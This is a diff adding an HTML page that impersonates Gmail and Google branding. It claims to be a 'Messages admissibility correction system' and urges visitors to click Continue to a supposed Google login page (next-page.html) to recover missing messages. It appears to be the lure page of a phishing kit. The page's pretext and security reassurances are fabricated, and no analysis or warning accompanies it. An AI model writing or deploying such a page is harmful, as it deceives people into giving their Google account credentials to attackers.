@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Gmail</title>
+
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<link rel="icon" href="google-icon.png" type="image/gif/png">
+	<!-- <link rel="stylesheet" type="text/css" href="style.css"> -->
+
+	<style type="text/css">
+		body{
+			/*font-family: Century Gothic;*/
+			/*font-family: Century Gothic;*/
+			/*font-family: sans-serif;*/
+			font-family: calibri;
+			/*color: ;*/
+			font-weight: 400;
+		}
+
+		.context-title{
+			font-size: 35px;
+			font-weight: 500;
+			color: rgba(0,0,0,0.8);
+		}
+
+		.img-2fa{
+			width: 100%; 
+			height: 100px;
+		}
+
+		.principal-block{
+			width: 45%;
+			margin: 0 auto;
+			margin-top: 20px;
+		}
+			.add-blf-title{
+				font-size: 20px;
+				font-weight: 600;
+				color: rgba(0,0,0,0.7);
+			}
+
+/*			.add-blf{
+				font-size: 15px;
+			}*/
+			
+			.msg-text{
+				font-size: 17px;
+			}
+
+		.redirections{
+			margin-top: 30px;
+		}
+
+		#button-redirect{
+			text-decoration: none;
+			font-size: 18px;
+			color: white;
+			padding: 10px;
+			background-color: #2962ff;
+			border-radius: 5px;
+			position: absolute; 
+			right: 30px;
+
+			/*float: right;*/
+		}
+		
+		#button-redirect:hover {
+			background-color: #007fff;
+		}
+
+		.container-bottom{
+			display: flex;
+			margin-top: 100px;
+		}
+
+			.added-elts-content{
+				display: flex;
+			}
+
+				.added-elts-item{
+					display: flex;
+					margin: 0 10px;
+				}
+
+			.select-language{
+				border-style: none;
+				outline: none;
+				font-family: calibri;
+				font-size: 14px;
+			}
+
+
+
+
+
+/*TABLETTES*/
+@media screen and (min-width: 769px) and (max-width: 992px){
+		.principal-block{
+			width: 70%;
+			/*margin-top: 10px;*/
+		}
+
+			.container-bottom{
+				margin-top: 200px;
+			}
+
+}
+
+
+/*TELEPHONES*/
+@media screen and (max-width: 768px){
+		.principal-block{
+			width: 95%;
+			margin-top: 10px;
+		}
+
+			.img-2fa{
+				/*width: 100%; */
+				height: 60px;
+			}
+
+			.add-img{
+				max-width: 55px;
+			}
+
+			.context-title{
+				font-size: 18px;
+			}
+
+			.add-blf-title{
+				font-size: 17px;
+				/*font-weight: 600;*/
+				/*color: rgba(0,0,0,0.7);*/
+			}
+
+			.msg-text{
+				font-size: 14px;
+			}
+
+			.small-on-phone{
+				font-size: 12px;
+			}
+
+
+
+		#button-redirect{
+			font-size: 14px;
+			padding: 8px;
+			right: 10px;
+			margin-bottom: 30px;
+		}
+
+	.container-bottom-content{
+		display: none;
+	}
+
+	.added-elts-content{
+		color: rgba(0,0,0,0.5);
+		font-size: 12px;
+	}
+}
+
+
+
+
+
+	</style>
+</head>
+<body>
+	<div class="principal-block">
+		<img src="google-img.png">
+		<p class="context-title">Messages admissibility correction system</p>
+		<div>
+			<img src="file_2fa.svg" class="img-2fa">
+		</div>
+
+		<p class="add-blf-title">You're protected by Google Security</p>
+		<!-- <p class="add-blf">Two-step validation is activated on your Google Account. This is a tried-and-tested method of protecting your account and countering cyber-attacks on the Internet.</p> -->
+
+		<p class="msg-text small-on-phone">This is a page redirecting you to the login page where you can check the admissibility of all your correspondents' messages. This procedure is necessary because it enables us to limit spam and only take into account important messages.</p>
+
+
+
+		<p class="msg-text">By clicking on the button below, you will be redirected to the Google login page, from which you can validate the correction required for the admissibility of all missing messages.</p>
+
+		<div style="width: 100%; display: flex; align-items: center; justify-content: center;">
+			<img class="add-img" src="add-img.svg">
+		</div>
+
+		<div class="redirections">
+			<div style="width: 100%; position: relative;">
+				<a id="button-redirect" href="next-page.html">Continue</a>
+			</div>
+<!-- 			<a id="" style="display: none" href="#">Continue</a>
+			<a id="" style="display: none" href="#">Continue</a>
+			<a id="" style="display: none" href="#">Continue</a>
+			<a id="" style="display: none" href="#">Continue</a>
+			<a id="" style="display: none" href="#">Continue</a> -->
+		</div>
+	</div>
+
+	<div class="container-bottom">
+		<div class="container-bottom-content">		
+			<select class="select-language">
+				<option>‪English (United States)‬</option>
+			</select>
+		</div>
+		<div class="added-elts">
+			<div class="added-elts-content">
+				<div class="added-elts-item added-elts-1">Help</div>
+				<div class="added-elts-item added-elts-2">Privacy</div>
+				<div class="added-elts-item added-elts-3">Terms</div>
+			</div>
+		</div>
+	</div>
+
+</body>
+</html>
